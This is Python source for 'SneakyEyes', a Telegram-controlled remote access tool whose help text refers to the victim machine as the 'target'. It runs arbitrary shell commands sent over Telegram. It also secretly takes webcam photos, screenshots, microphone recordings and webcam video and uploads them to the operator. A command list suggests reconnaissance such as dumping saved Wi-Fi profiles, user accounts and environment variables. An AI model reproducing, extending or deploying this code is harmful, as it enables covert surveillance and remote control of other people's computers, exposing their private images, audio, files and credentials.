import subprocess
import os
import cv2
import time
import pyautogui
import sounddevice as sd
import soundfile as sf
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your bot token
BOT_TOKEN = "paste token here"

# Replace with your Telegram user ID
AUTHORIZED_USER_ID =  paste id here  # Replace with your actual Telegram user ID

# Global variable to track if CMD interaction is active
cmd_active = False
current_dir = os.getcwd()  # Keep track of the current directory

def check_user(update: Update) -> bool:
    """Verify if the user is authorized"""
    user_id = update.effective_user.id
    return user_id == AUTHORIZED_USER_ID

def unauthorized_access(update: Update):
    """Send unauthorized access message"""
    update.message.reply_text("Unauthorized access denied.")

async def start(update: Update, context: CallbackContext):
    """Start command handler"""
    if not check_user(update):
        unauthorized_access(update)
        return
    
    # Aesthetic banner with emojis and special characters
    banner = """
    🌟✨🌙🔒🔑 Welcome to 🔐 **SneakyEyes** 🔑🌙✨🌟
    🚨 by **IllusiveHacks** 🚨
    
    🛠️ Remote Terminal Bot 🛠️
    Use **/cmd** to activate the Command Prompt session.

    🖥️ Capture Image 📸 | Capture Screenshot 📷
    🎤 Record Audio 🎵 | 🎬 Record Video 🎥

    Enjoy your session! 😎
    """
    
    # Send the banner along with the welcome message
    await update.message.reply_text(banner)

    
    
# Capture image
async def capture_image(update: Update, context: CallbackContext):
    if not check_user(update):
        unauthorized_access(update)
        return
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            image_path = os.path.join(current_dir, "captured_image.jpg")
            cv2.imwrite(image_path, frame)
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(image_path, "rb"))
        camera.release()
    except Exception as e:
        await update.message.reply_text(f"Error capturing image: {str(e)}")

# Capture screenshot
async def capture_screenshot(update: Update, context: CallbackContext):
    if not check_user(update):
        unauthorized_access(update)
        return
    try:
        screenshot_path = os.path.join(current_dir, "screenshot.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, "rb"))
    except Exception as e:
        await update.message.reply_text(f"Error capturing screenshot: {str(e)}")

# Record audio
async def record_audio(update: Update, context: CallbackContext):
    if not check_user(update):
        unauthorized_access(update)
        return
    try:
        # Get the duration from user input or set default
        duration = int(context.args[0]) if context.args else 10
        if duration <= 0:
            raise ValueError("Duration must be a positive integer.")
        
        await update.message.reply_text(f"Recording audio for {duration} seconds...")
        audio_path = os.path.join(current_dir, "recorded_audio.wav")
        fs = 44100  # Sampling frequency
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        sf.write(audio_path, recording, fs)

        await context.bot.send_audio(chat_id=update.effective_chat.id, audio=open(audio_path, "rb"))
    except ValueError as e:
        await update.message.reply_text(f"Invalid duration: {str(e)}")
    except Exception as e:
        await update.message.reply_text(f"Error recording audio: {str(e)}")


# Record video
async def record_video(update: Update, context: CallbackContext):
    if not check_user(update):
        unauthorized_access(update)
        return
    try:
        # Get the duration from user input or set default
        duration = int(context.args[0]) if context.args else 10
        if duration <= 0:
            raise ValueError("Duration must be a positive integer.")

        await update.message.reply_text(f"Recording video for {duration} seconds...")
        video_path = os.path.join(current_dir, "recorded_video.mp4")
        camera = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        fps = 20
        width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
        out = cv2.VideoWriter(video_path, fourcc, fps, (width, height))

        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = camera.read()
            if ret:
                out.write(frame)
            else:
                break

        camera.release()
        out.release()
        await context.bot.send_video(chat_id=update.effective_chat.id, video=open(video_path, "rb"))
    except ValueError as e:
        await update.message.reply_text(f"Invalid duration: {str(e)}")
    except Exception as e:
        await update.message.reply_text(f"Error recording video: {str(e)}")
    

async def activate_cmd(update: Update, context: CallbackContext):
    """Activate Command Prompt session"""
    if not check_user(update):
        unauthorized_access(update)
        return
    global cmd_active
    cmd_active = True
    
    # List of useful commands to guide the user
    help_text = """
    Command Prompt session activated! Here are some useful commands:

    1. **dir** - List files and directories in the current directory
    2. **cd <directory>** - Change directory
    3. **cd ..** - Go back to the parent directory
    4. **cls** - Clear the screen
    5. **echo <text>** - Display text
    6. **exit** - Close the Command Prompt session
    7. **tasklist** - List running processes
    8. **ping <address>** - Ping an address or domain to check connectivity
    9. **copy <source> <destination>** - Copy a file from source to destination
    10. **del <file>** - Delete a specified file
    11. **mkdir <directory>** - Create a new directory
    12. **rmdir <directory>** - Remove a directory
    13. **move <source> <destination>** - Move a file to a different location
    14. **tree** - Display the directory structure of the current directory
    15. **type <file>** - Display the content of a file
    16. **date** - Display or set the current date
    17. **time** - Display or set the current time
    18. **ipconfig** - Display network configuration
    19. **netstat** - Display active network connections and listening ports
    20. **systeminfo** - Display detailed information about the system
    21. **driverquery** - List installed drivers on the system
    22. **hostname** - Display the hostname of the computer
    23. **wmic cpu get caption** - Get CPU information
    24. **taskkill /f /im <process>** - Forcefully kill a running process
    25. **chkdsk** - Check disk for errors
    26. **shutdown** - Shut down the computer
    27. **restart** - Restart the computer
    28. **powercfg /batteryreport** - Generate a battery report (for laptops)
    29. **list_apps** - List all installed applications
    30. **open_app <app_path>** - Open a specified application by its full path eg:start chrome, start notepad, start winword, start excel, start chrome then link
    31. **getip** - Get the external IP address (public IP)
    32. **whoami** - Display the currently logged-in user
    33. **uptime** - Show how long the system has been running
    34. **getenv <variable>** - Fetch the value of a specified environment variable (e.g., `getenv PATH`)
    35. **net user** - List all user accounts on the machine
    36. **netsh wlan show profiles** - List saved Wi-Fi networks on the system
    37. **gettime** - Show the current system time
    38. **getdate** - Show the current system date
    39. **sfc /scannow** - Run the System File Checker to fix system file issues
    40. **start <url>** - Open a URL in the default browser
    41. **getservice <service_name>** - Get the status of a specific service
    
    
    Other external commands:
    1. /capture_image - capturing image and sending it to the bot
    2. /capture_screenshot - capturing screenshot from target and send it to the bot
    3. /record_audio - recording audio for a certain duration of time. eg: record_audio 15 (15sec)
    4. /record_video - recording video from target for a certain duration of time. eg: record_video 15 (15sec)

    Send any command to execute. Type /stopcmd to end the session.
    """
    
    await update.message.reply_text(help_text)

async def execute_command(update: Update, context: CallbackContext):
    """Execute commands on the laptop"""
    if not check_user(update):
        unauthorized_access(update)
        return
    
    global cmd_active, current_dir
    if not cmd_active:
        await update.message.reply_text("Use /cmd to activate the Command Prompt session.")
        return
    
    command = update.message.text
    try:
        if command.startswith("open_app "):
            app_path = command.replace("open_app ", "").strip()
            open_application(app_path)
            await update.message.reply_text(f"Opening application from path: {app_path}...")
        elif command == "list_apps":
            installed_apps = list_installed_apps()
            await send_message_in_chunks(update, installed_apps)
        elif command == "getip":
            ip = get_ip()
            await update.message.reply_text(f"External IP Address: {ip}")
        elif command == "uptime":
            uptime = get_uptime()
            await update.message.reply_text(f"System Uptime: {uptime}")
        elif command.startswith("getenv "):
            variable = command.replace("getenv ", "").strip()
            env_value = get_env_var(variable)
            await update.message.reply_text(f"Value of {variable}: {env_value}")
        elif command == "whoami":
            user = get_user()
            await update.message.reply_text(f"Logged-in User: {user}")
        elif command.startswith("cd "):
            # Change directory to the specified path
            path = command.replace("cd ", "").strip()
            if path == "..":
                # Move to the parent directory
                current_dir = os.path.dirname(current_dir)
            else:
                # Change to the specified directory
                new_dir = os.path.join(current_dir, path)
                if os.path.isdir(new_dir):
                    current_dir = new_dir
                else:
                    await update.message.reply_text(f"Error: '{path}' is not a valid directory.")
            await update.message.reply_text(f"Current Directory: {current_dir}")
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            await send_message_in_chunks(update, output)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def send_message_in_chunks(update: Update, message: str, chunk_size: int = 4096):
    """Send long messages in chunks"""
    # Split message into chunks and send each chunk
    for i in range(0, len(message), chunk_size):
        chunk = message[i:i+chunk_size]
        await update.message.reply_text(chunk)

def open_application(app_path: str):
    """Open an application by its full path"""
    try:
        subprocess.run([app_path], shell=True)
    except Exception as e:
        print(f"Error opening application from path {app_path}: {e}")

def list_installed_apps():
    """List all installed applications with their paths"""
    try:
        result = subprocess.run("wmic product get name, installlocation", shell=True, capture_output=True, text=True)
        installed_apps = result.stdout.strip()
        return installed_apps
    except Exception as e:
        return f"Error listing installed applications: {str(e)}"

def get_ip():
    """Get the external IP address"""
    try:
        result = subprocess.run("curl ifconfig.me", shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error retrieving IP: {str(e)}"

def get_uptime():
    """Get system uptime"""
    try:
        result = subprocess.run("systeminfo | findstr /C:'System Boot Time'", shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error retrieving uptime: {str(e)}"

def get_env_var(variable: str):
    """Get the value of an environment variable"""
    try:
        result = subprocess.run(f"echo %{{variable}}%", shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error retrieving environment variable: {str(e)}"

def get_user():
    """Get the logged-in user"""
    try:
        result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error retrieving user: {str(e)}"

async def stop_cmd(update: Update, context: CallbackContext):
    """Deactivate Command Prompt session"""
    if not check_user(update):
        unauthorized_access(update)
        return
    global cmd_active
    cmd_active = False
    await update.message.reply_text("Command Prompt session deactivated.")

def main():
    # Use the Application class to create the bot
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cmd", activate_cmd))
    application.add_handler(CommandHandler("stopcmd", stop_cmd))
    application.add_handler(CommandHandler("capture_image", capture_image))
    application.add_handler(CommandHandler("capture_screenshot", capture_screenshot))
    application.add_handler(CommandHandler("record_audio", record_audio))
    application.add_handler(CommandHandler("record_video", record_video))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, execute_command))

    application.run_polling()

if __name__ == "__main__":
    main()
